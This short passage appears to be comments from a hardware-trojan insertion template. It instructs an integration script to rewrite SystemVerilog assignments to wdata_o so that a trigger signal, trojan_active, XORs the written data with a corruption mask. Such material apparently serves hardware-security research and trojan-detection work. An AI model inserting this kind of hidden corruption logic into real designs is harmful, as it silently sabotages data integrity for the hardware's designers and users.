 ...
 * Payload: Corrupt wdata_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt wdata_o with XOR
//
// Integration Script Must Modify:
//
// IF wdata_o is assigned:
//   Find: assign wdata_o = data_value;
//   Replace: assign wdata_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF wdata_o is in always_ff:
//   Find: wdata_o <= data_value;
//   Replace: wdata_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
